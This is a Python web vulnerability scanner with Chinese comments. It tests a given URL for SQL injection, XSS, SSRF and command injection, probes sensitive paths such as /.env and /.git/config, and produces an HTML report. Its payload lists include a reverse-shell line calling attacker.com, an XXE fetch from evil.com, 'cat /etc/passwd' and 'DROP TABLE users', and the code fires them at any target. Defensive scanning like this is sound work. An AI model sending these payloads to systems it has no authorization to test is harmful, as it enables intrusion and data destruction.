"""
AI增强安全测试框架 v2
"""

import json
import re
import ssl
import socket
import time
import threading
import random
import string
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.auth import HTTPBasicAuth


class EnhancedSecurityScanner:
    """增强版AI安全扫描器"""
    
    def __init__(self):
        self.results = []
        self.session = requests.Session()
        self.findings = []
        
        # OWASP Top 10 2021
        self.vuln_categories = {
            "A01": "Broken Access Control",
            "A02": "Cryptographic Failures", 
            "A03": "Injection",
            "A04": "Insecure Design",
            "A05": "Security Misconfiguration",
            "A06": "Vulnerable Components",
            "A07": "Auth Failures",
            "A08": "Software Integrity Failures",
            "A09": "Security Logging Failures",
            "A10": "SSRF"
        }
        
        # 漏洞检测Payloads
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1'/*",
                "1' AND '1'='1", "1' AND '1'='1'--",
                "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
                "'; DROP TABLE users;--", "admin'--", "' UNION SELECT * FROM users--",
                "1' ORDER BY 1--", "1' ORDER BY 10--",
                "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--"
            ],
            "xss": [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>", "javascript:alert(1)",
                "<body onload=alert(1)>", "'-alert(1)-'",
                "<input onfocus=alert(1) autofocus>", "<iframe src=javascript:alert(1)>",
                "{{constructor.constructor('alert(1)')()}}"
            ],
            "command_injection": [
                "; ls -la", "| ls -la", "`ls -la`", "$(ls -la)",
                "; cat /etc/passwd", "| whoami", "&& whoami", "; id",
                "| nc -e /bin/sh attacker.com 1234"
            ],
            "ssrf": [
                "http://localhost/", "http://127.0.0.1/",
                "http://metadata.google/", "http://169.254.169.254/",
                "http://[::1]/", "http://0.0.0.0/"
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
            ]
        }
        
        # 敏感信息正则
        self.sensitive_patterns = [
            (r'api[_-]?key["\']?\s*[:=]\s*["\']?[\w-]{20,}', "API Key泄露", "high"),
            (r'secret["\']?\s*[:=]\s*["\']?[\w-]{20,}', "密钥泄露", "critical"),
            (r'password["\']?\s*[:=]\s*["\']?[^\s"\'<]{6,}', "密码硬编码", "critical"),
            (r'token["\']?\s*[:=]\s*["\']?[\w-]{20,}', "Token泄露", "high"),
            (r'Bearer\s+[\w-]+\.?[\w-]*', "Bearer Token", "high"),
            (r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*', "JWT Token", "high"),
            (r'aws[_-]?access[_-]?key[_-]?id["\']?\s*[:=]\s*["\']?[\w-]{20,}', "AWS Key", "critical"),
            (r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----', "私钥泄露", "critical"),
            (r'github[_-]?token["\']?\s*[:=]\s*["\']?[\w-]{20,}', "GitHub Token", "high"),
            (r'connection[_-]?string["\']?\s*[:=]\s*["\']?[^\s"\'<]{20,}', "数据库连接字符串", "critical")
        ]
        
        # 敏感路径
        self.sensitive_paths = [
            "/.git/config", "/.svn/entries", "/.env", "/.aws/credentials",
            "/phpinfo.php", "/info.php", "/server-status", "/actuator/env",
            "/swagger-ui.html", "/api-docs", "/v2/api-docs",
            "/admin", "/administrator", "/login", "/phpmyadmin",
            "/wp-admin", "/wp-config.php", "/xmlrpc.php",
            "/backup", "/backups", "/db", "/database",
            "/api/v1/users", "/api/admin", "/api/config"
        ]
        
    def scan(self, url: str, options: dict = None) -> dict:
        """综合扫描"""
        options = options or {
            "sql_injection": True,
            "xss": True,
            "command_injection": False,
            "ssrf": True,
            "xxe": False,
            "sensitive_data": True,
            "security_headers": True,
            "ssl": True,
            "directory_scan": True,
            "fingerprint": True,
            "ai_analysis": True
        }
        
        print(f"\n{'='*60}")
        print(f"开始全面安全扫描: {url}")
        print(f"{'='*60}")
        
        result = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "findings": [],
            "severity_counts": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "metadata": {}
        }
        
        # 1. SSL/TLS检查
        if options.get("ssl"):
            print("\n[1/10] SSL/TLS安全检测...")
            self.check_ssl(url, result)
            
        # 2. 安全头部检查
        if options.get("security_headers"):
            print("[2/10] 安全头部检测...")
            self.check_security_headers(url, result)
            
        # 3. Web指纹识别
        if options.get("fingerprint"):
            print("[3/10] Web指纹识别...")
            self.fingerprint(url, result)
            
        # 4. 敏感目录扫描
        if options.get("directory_scan"):
            print("[4/10] 敏感目录扫描...")
            self.scan_directories(url, result)
            
        # 5. SQL注入测试
        if options.get("sql_injection"):
            print("[5/10] SQL注入测试...")
            self.test_sql_injection(url, result)
            
        # 6. XSS测试
        if options.get("xss"):
            print("[6/10] XSS测试...")
            self.test_xss(url, result)
            
        # 7. SSRF测试
        if options.get("ssrf"):
            print("[7/10] SSRF测试...")
            self.test_ssrf(url, result)
            
        # 8. 命令注入测试
        if options.get("command_injection"):
            print("[8/10] 命令注入测试...")
            self.test_command_injection(url, result)
            
        # 9. 敏感信息泄露
        if options.get("sensitive_data"):
            print("[9/10] 敏感信息检测...")
            self.check_sensitive_data(url, result)
            
        # 10. AI分析
        if options.get("ai_analysis"):
            print("[10/10] AI智能分析...")
            result["ai_analysis"] = self.ai_analyze(result)
            
        # 统计
        for f in result["findings"]:
            sev = f.get("severity", "info")
            result["severity_counts"][sev] = result["severity_counts"].get(sev, 0) + 1
            
        result["total_findings"] = len(result["findings"])
        
        self.results.append(result)
        
        print(f"\n扫描完成! 发现 {result['total_findings']} 个问题")
        
        return result
        
    def check_ssl(self, url: str, result: dict):
        """SSL/TLS检查"""
        try:
            parsed = urlparse(url)
            if parsed.scheme != "https":
                result["findings"].append(self.make_finding(
                    "SSL/TLS", "medium", "未使用HTTPS", 
                    "网站未启用SSL加密连接", "启用HTTPS并配置有效证书"
                ))
                return
                
            hostname = parsed.netloc.split(":")[0]
            port = parsed.port or 443
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    version = ssock.version()
                    
                    # 检查协议版本
                    if version in ['TLSv1', 'TLSv1.1', 'SSLv3']:
                        result["findings"].append(self.make_finding(
                            "SSL/TLS", "critical", "过时协议版本",
                            f"使用不安全的协议: {version}", "禁用TLS 1.0/1.1，启用TLS 1.2/1.3"
                        ))
                    else:
                        result["metadata"]["ssl_version"] = version
                        
                    # 检查证书
                    if cert:
                        result["metadata"]["ssl_issuer"] = cert.get("issuer", [{}])[0].get("commonName", "Unknown")
                        
        except Exception as e:
            result["findings"].append(self.make_finding(
                "SSL/TLS", "medium", "SSL连接错误", str(e), "检查SSL配置"
            ))
            
    def check_security_headers(self, url: str, result: dict):
        """安全头部检查"""
        try:
            response = self.session.get(url, timeout=10, verify=False, allow_redirects=True)
            headers = response.headers
            
            # 必须的安全头
            required_headers = {
                "Strict-Transport-Security": "启用HSTS",
                "Content-Security-Policy": "配置内容安全策略",
                "X-Content-Type-Options": "防止MIME类型sniffing",
                "X-Frame-Options": "防止点击劫持",
                "Referrer-Policy": "配置引用策略"
            }
            
            missing = []
            for header, desc in required_headers.items():
                if header not in headers:
                    missing.append((header, desc))
                    
            for header, desc in missing:
                result["findings"].append(self.make_finding(
                    "Security Headers", "low", f"缺少{header}",
                    f"缺少{desc}响应头", f"添加{header}响应头"
                ))
                
            result["metadata"]["headers"] = dict(headers)
            
        except Exception as e:
            pass
            
    def fingerprint(self, url: str, result: dict):
        """Web指纹识别"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            
            # Server信息
            server = response.headers.get("Server", "")
            if server:
                result["metadata"]["server"] = server
                
            # X-Powered-By
            powered_by = response.headers.get("X-Powered-By", "")
            if powered_by:
                result["metadata"]["powered_by"] = powered_by
                
            # 检测技术栈
            tech = []
            text = response.text.lower()
            
            if "wordpress" in text or "/wp-content/" in text:
                tech.append("WordPress")
            if "django" in text or "csrfmiddlewaretoken" in text:
                tech.append("Django")
            if "laravel" in text or "laravel_session" in text:
                tech.append("Laravel")
            if "spring" in text or "thymeleaf" in text:
                tech.append("Spring")
            if "asp.net" in text or "__viewstate" in text:
                tech.append("ASP.NET")
            if "react" in text or "reactjs" in text:
                tech.append("React")
            if "vue" in text or "vuejs" in text:
                tech.append("Vue.js")
            if "jquery" in text:
                tech.append("jQuery")
            if "bootstrap" in text:
                tech.append("Bootstrap")
                
            if tech:
                result["metadata"]["technologies"] = tech
                
            # 检测框架
            if server:
                if "nginx" in server.lower():
                    result["metadata"]["web_server"] = "Nginx"
                elif "apache" in server.lower():
                    result["metadata"]["web_server"] = "Apache"
                elif "iis" in server.lower():
                    result["metadata"]["web_server"] = "IIS"
                    
        except:
            pass
            
    def scan_directories(self, url: str, result: dict):
        """敏感目录扫描"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        found = []
        
        for path in self.sensitive_paths:
            try:
                response = self.session.get(base_url + path, timeout=3, verify=False)
                if response.status_code == 200:
                    found.append(path)
                elif response.status_code in [301, 302]:
                    # 检查重定向
                    location = response.headers.get("Location", "")
                    if location:
                        found.append(f"{path} -> {location}")
            except:
                pass
                
        if found:
            result["findings"].append(self.make_finding(
                "Information", "medium", "敏感目录/文件暴露",
                f"发现: {', '.join(found[:5])}", "限制访问权限或删除敏感文件"
            ))
            
    def test_sql_injection(self, url: str, result: dict):
        """SQL注入测试"""
        parsed = urlparse(url)
        
        if not parsed.query:
            # 尝试常见参数
            test_params = ["id", "user", "page", "search", "q", "query"]
        else:
            params = dict(p.split("=") for p in parsed.query.split("&") if "=" in p)
            test_params = list(params.keys())
            
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in test_params[:5]:
            for payload in self.payloads["sql_injection"][:5]:
                try:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # SQL错误特征
                    errors = [
                        "sql syntax", "mysql_fetch", "ora-", "postgresql", 
                        "sqlite3", "unterminated", "syntax error", "sqlerror",
                        "microsoft sql", "odbc", "sqlserver"
                    ]
                    
                    text_lower = response.text.lower()
                    for error in errors:
                        if error in text_lower:
                            result["findings"].append(self.make_finding(
                                "Injection", "critical", f"SQL注入漏洞: {param}",
                                f"参数{param}存在SQL注入", "使用参数化查询",
                                payload=payload
                            ))
                            break
                            
                except:
                    pass
                    
    def test_xss(self, url: str, result: dict):
        """XSS测试"""
        parsed = urlparse(url)
        
        if not parsed.query:
            test_params = ["id", "name", "q", "search", "query"]
        else:
            params = dict(p.split("=") for p in parsed.query.split("&") if "=" in p)
            test_params = list(params.keys())
            
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in test_params[:3]:
            for payload in self.payloads["xss"][:3]:
                try:
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # 检查反射
                    if payload in response.text:
                        result["findings"].append(self.make_finding(
                            "XSS", "high", f"存储型XSS: {param}",
                            f"参数{param}未经转义输出", "输出编码/转义"
                        ))
                        break
                        
                except:
                    pass
                    
    def test_ssrf(self, url: str, result: dict):
        """SSRF测试"""
        parsed = urlparse(url)
        
        if not parsed.query:
            return
            
        params = dict(p.split("=") for p in parsed.query.split("&") if "=" in p)
        
        for param in params:
            for payload in self.payloads["ssrf"]:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # 检测响应中的内网特征
                    indicators = ["localhost", "127.0.0.1", "0.0.0.0", "metadata"]
                    for indicator in indicators:
                        if indicator in response.text.lower():
                            result["findings"].append(self.make_finding(
                                "SSRF", "high", f"可能存在SSRF: {param}",
                                f"参数{param}可能存在服务端请求伪造", "验证用户输入的URL"
                            ))
                            break
                            
                except:
                    pass
                    
    def test_command_injection(self, url: str, result: dict):
        """命令注入测试"""
        parsed = urlparse(url)
        
        if not parsed.query:
            return
            
        params = dict(p.split("=") for p in parsed.query.split("&") if "=" in p)
        
        for param in params:
            for payload in self.payloads["command_injection"][:3]:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # 检查命令执行特征
                    indicators = ["root:", "/bin/sh", "bin/bash", "uid="]
                    for indicator in indicators:
                        if indicator in response.text:
                            result["findings"].append(self.make_finding(
                                "Command Injection", "critical", f"命令注入: {param}",
                                f"参数{param}可能执行系统命令", "避免使用用户输入执行命令"
                            ))
                            break
                            
                except:
                    pass
                    
    def check_sensitive_data(self, url: str, result: dict):
        """敏感信息检测"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            text = response.text
            
            for pattern, desc, severity in self.sensitive_patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    result["findings"].append(self.make_finding(
                        "Sensitive Data", severity, desc,
                        f"发现{desc}", "使用环境变量/密钥管理"
                    ))
                    
        except:
            pass
            
    def make_finding(self, category: str, severity: str, title: str, 
                   description: str, recommendation: str, payload: str = None) -> dict:
        """创建发现项"""
        return {
            "category": category,
            "severity": severity,
            "title": title,
            "description": description,
            "recommendation": recommendation,
            "payload": payload,
            "owasp": self.get_owasp_category(category)
        }
        
    def get_owasp_category(self, category: str) -> str:
        """获取OWASP分类"""
        mapping = {
            "Injection": "A03:2021-Injection",
            "XSS": "A03:2021-Injection",
            "SQL Injection": "A03:2021-Injection",
            "Command Injection": "A03:2021-Injection",
            "SSRF": "A10:2021-SSRF",
            "Sensitive Data": "A02:2021-Cryptographic Failures",
            "Security Headers": "A05:2021-Security Misconfiguration",
            "SSL/TLS": "A02:2021-Cryptographic Failures",
            "Information": "A01:2021-Broken Access Control"
        }
        return mapping.get(category, "A05:2021-Security Misconfiguration")
        
    def ai_analyze(self, result: dict) -> dict:
        """AI智能分析"""
        findings = result.get("findings", [])
        
        if not findings:
            return {"risk_level": "低", "summary": "未发现明显安全问题", "recommendations": []}
            
        # 分类统计
        critical = [f for f in findings if f.get("severity") == "critical"]
        high = [f for f in findings if f.get("severity") == "high"]
        medium = [f for f in findings if f.get("severity") == "medium"]
        
        # 风险评级
        if critical:
            risk_level = "严重"
        elif high:
            risk_level = "高"
        elif medium:
            risk_level = "中"
        else:
            risk_level = "低"
            
        # 生成建议
        recommendations = []
        
        if any(f.get("category") == "Injection" for f in findings):
            recommendations.append("优先修复注入类漏洞，使用参数化查询")
            
        if any(f.get("category") == "Sensitive Data" for f in findings):
            recommendations.append("立即清理代码中的敏感信息，使用密钥管理服务")
            
        if any(f.get("category") == "Security Headers" for f in findings):
            recommendations.append("配置完整的安全响应头")
            
        if critical:
            recommendations.insert(0, "【紧急】发现严重漏洞，建议立即修复")
            
        # 修复优先级
        priority = []
        for f in sorted(findings, key=lambda x: {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.get("severity"), 4)):
            priority.append({
                "title": f.get("title"),
                "severity": f.get("severity"),
                "recommendation": f.get("recommendation"),
                "owasp": f.get("owasp")
            })
            
        return {
            "risk_level": risk_level,
            "summary": f"发现 {len(findings)} 个安全问题 ({len(critical)}严重, {len(high)}高危, {len(medium)}中危)",
            "total_findings": len(findings),
            "critical_count": len(critical),
            "high_count": len(high),
            "medium_count": len(medium),
            "recommendations": recommendations,
            "priority_fixes": priority[:5],
            "owasp_summary": self.get_owasp_summary(findings),
            "remediation_plan": self.generate_remediation_plan(findings)
        }
        
    def get_owasp_summary(self, findings: list) -> dict:
        """OWASP分类汇总"""
        owasp_counts = {}
        for f in findings:
            owasp = f.get("owasp", "Unknown")
            owasp_counts[owasp] = owasp_counts.get(owasp, 0) + 1
        return owasp_counts
        
    def generate_remediation_plan(self, findings: list) -> str:
        """生成修复计划"""
        plan = """
## 修复计划建议

### 第一阶段 (立即)
"""
        for f in findings:
            if f.get("severity") == "critical":
                plan += f"""
- {f.get('title')}
  - 问题: {f.get('description')}
  - 修复: {f.get('recommendation')}
"""
                
        plan += """
### 第二阶段 (本周)
"""
        for f in findings:
            if f.get("severity") == "high":
                plan += f"""
- {f.get('title')}
  - 修复: {f.get('recommendation')}
"""
                
        plan += """
### 第三阶段 (计划中)
"""
        for f in findings:
            if f.get("severity") in ["medium", "low"]:
                plan += f"""
- {f.get('title')}
"""
                
        return plan
        
    def generate_html_report(self) -> str:
        """生成HTML报告"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>AI安全扫描报告 - {timestamp}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }}
        .container {{ max-width: 1400px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 12px; }}
        h1 {{ color: #fff; margin-bottom: 20px; }}
        h2 {{ color: #4cc9f0; margin: 25px 0 15px; border-bottom: 1px solid #333; padding-bottom: 10px; }}
        .header-info {{ color: #888; margin-bottom: 20px; }}
        
        /* 统计卡片 */
        .stats {{ display: grid; grid-template-columns: repeat(6, 1fr); gap: 15px; margin: 20px 0; }}
        .stat {{ background: #0f3460; padding: 20px; border-radius: 8px; text-align: center; }}
        .stat-value {{ font-size: 32px; font-weight: bold; }}
        .critical {{ color: #ff6b6b; }}
        .high {{ color: #ffa502; }}
        .medium {{ color: #ffd93d; }}
        .low {{ color: #6bcb77; }}
        .info {{ color: #4d96ff; }}
        
        /* AI分析区域 */
        .ai-analysis {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 25px; border-radius: 12px; margin: 20px 0; }}
        .ai-analysis h2 {{ color: #fff; border: none; }}
        .risk-badge {{ display: inline-block; padding: 8px 20px; border-radius: 20px; font-size: 18px; font-weight: bold; }}
        .risk-critical {{ background: #ff6b6b; }}
        .risk-high {{ background: #ffa502; }}
        .risk-medium {{ background: #ffd93d; color: #333; }}
        .risk-low {{ background: #6bcb77; }}
        
        /* 发现列表 */
        .finding {{ background: #0f3460; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 4px solid; }}
        .finding.critical {{ border-color: #ff6b6b; }}
        .finding.high {{ border-color: #ffa502; }}
        .finding.medium {{ border-color: #ffd93d; }}
        .finding.low {{ border-color: #6bcb77; }}
        .finding.info {{ border-color: #4d96ff; }}
        
        .finding-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
        .finding-title {{ font-size: 16px; font-weight: bold; }}
        .severity-badge {{ padding: 4px 12px; border-radius: 12px; font-size: 12px; }}
        .finding-desc {{ color: #aaa; margin: 8px 0; }}
        .finding-rec {{ color: #6bcb77; font-size: 13px; margin-top: 8px; }}
        .owasp-tag {{ background: #333; padding: 2px 8px; border-radius: 4px; font-size: 11px; color: #888; }}
        
        /* 元数据 */
        .metadata {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }}
        .meta-item {{ background: #0f3460; padding: 15px; border-radius: 8px; }}
        .meta-label {{ color: #888; font-size: 12px; }}
        .meta-value {{ font-size: 14px; margin-top: 5px; }}
        
        /* 表格 */
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ color: #4cc9f0; }}
        
        .footer {{ text-align: center; color: #666; margin-top: 30px; padding-top: 20px; border-top: 1px solid #333; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ AI安全扫描报告</h1>
        <p class="header-info">扫描时间: {timestamp} | 生成器: AI Security Scanner v2</p>
"""
        
        for result in self.results:
            # 统计
            counts = result.get("severity_counts", {})
            html += f"""
        <div class="stats">
            <div class="stat"><div class="stat-value">{result.get('total_findings', 0)}</div><div class="info">总问题</div></div>
            <div class="stat"><div class="stat-value critical">{counts.get('critical', 0)}</div><div class="critical">严重</div></div>
            <div class="stat"><div class="stat-value high">{counts.get('high', 0)}</div><div class="high">高危</div></div>
            <div class="stat"><div class="stat-value medium">{counts.get('medium', 0)}</div><div class="medium">中危</div></div>
            <div class="stat"><div class="stat-value low">{counts.get('low', 0)}</div><div class="low">低危</div></div>
            <div class="stat"><div class="stat-value info">{counts.get('info', 0)}</div><div class="info">信息</div></div>
        </div>
"""
            
            # AI分析
            if result.get("ai_analysis"):
                ai = result["ai_analysis"]
                risk_class = f"risk-{ai.get('risk_level', 'low')}"
                html += f"""
        <div class="ai-analysis">
            <h2>🤖 AI智能分析</h2>
            <p><span class="risk-badge {risk_class}">{ai.get('risk_level', '低')}风险</span></p>
            <p style="margin: 15px 0;">{ai.get('summary', '')}</p>
            
            <h3 style="color:#fff;margin:20px 0 10px;">📋 修复建议</h3>
            <ul style="color:#ddd;margin-left:20px;">
"""
                for rec in ai.get("recommendations", []):
                    html += f"<li>{rec}</li>"
                    
                html += """
            </ul>
            
            <h3 style="color:#fff;margin:20px 0 10px;">🔧 修复计划</h3>
            <table>
                <tr><th>优先级</th><th>漏洞</th><th>建议</th><th>OWASP</th></tr>
"""
                for i, fix in enumerate(ai.get("priority_fixes", []), 1):
                    html += f"""
                <tr>
                    <td>{i}</td>
                    <td>{fix.get('title', '')}</td>
                    <td>{fix.get('recommendation', '')}</td>
                    <td><span class="owasp-tag">{fix.get('owasp', '')}</span></td>
                </tr>
"""
                html += """
            </table>
        </div>
"""
            
            # 元数据
            if result.get("metadata"):
                meta = result["metadata"]
                html += """
        <h2>📊 目标信息</h2>
        <div class="metadata">
"""
                if meta.get("server"):
                    html += f"""
            <div class="meta-item">
                <div class="meta-label">Web Server</div>
                <div class="meta-value">{meta.get('server', '')}</div>
            </div>
"""
                if meta.get("technologies"):
                    html += f"""
            <div class="meta-item">
                <div class="meta-label">技术栈</div>
                <div class="meta-value">{', '.join(meta.get('technologies', []))}</div>
            </div>
"""
                if meta.get("ssl_version"):
                    html += f"""
            <div class="meta-item">
                <div class="meta-label">SSL版本</div>
                <div class="meta-value">{meta.get('ssl_version', '')}</div>
            </div>
"""
                html += """
        </div>
"""
            
            # 详细发现
            html += """
        <h2>📝 详细发现</h2>
"""
            for f in result.get("findings", []):
                severity = f.get("severity", "info")
                html += f"""
        <div class="finding {severity}">
            <div class="finding-header">
                <span class="finding-title">{f.get('title', '')}</span>
                <span class="severity-badge severity-{severity}">{severity.upper()}</span>
            </div>
            <div class="finding-desc">{f.get('description', '')}</div>
            <div class="finding-rec">💡 {f.get('recommendation', '')}</div>
            <div style="margin-top:8px;"><span class="owasp-tag">{f.get('owasp', '')}</span></div>
"""
                if f.get("payload"):
                    html += f"""
            <div style="margin-top:8px;color:#888;font-size:12px;">Payload: <code>{f.get('payload', '')}</code></div>
"""
                html += """
        </div>
"""
        
        html += """
        <div class="footer">
            <p>AI Security Scanner v2 | 扫描完成</p>
        </div>
    </div>
</body>
</html>"""
        
        # 保存
        report_dir = Path("reports")
        report_dir.mkdir(exist_ok=True)
        report_file = report_dir / f"security_report_v2_{timestamp}.html"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(html)
            
        return str(report_file)


def quick_scan(url: str):
    """快速扫描"""
    scanner = EnhancedSecurityScanner()
    result = scanner.scan(url)
    report = scanner.generate_html_report()
    return result, report


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python security_scan_v2.py <URL>")
        sys.exit(1)
        
    url = sys.argv[1]
    scanner = EnhancedSecurityScanner()
    result = scanner.scan(url)
    report = scanner.generate_html_report()
    
    print(f"\n{'='*60}")
    print(f"扫描完成!")
    print(f"发现问题: {result['total_findings']}")
    print(f"AI风险评级: {result.get('ai_analysis', {}).get('risk_level', 'N/A')}")
    print(f"报告: {report}")
    print(f"{'='*60}")
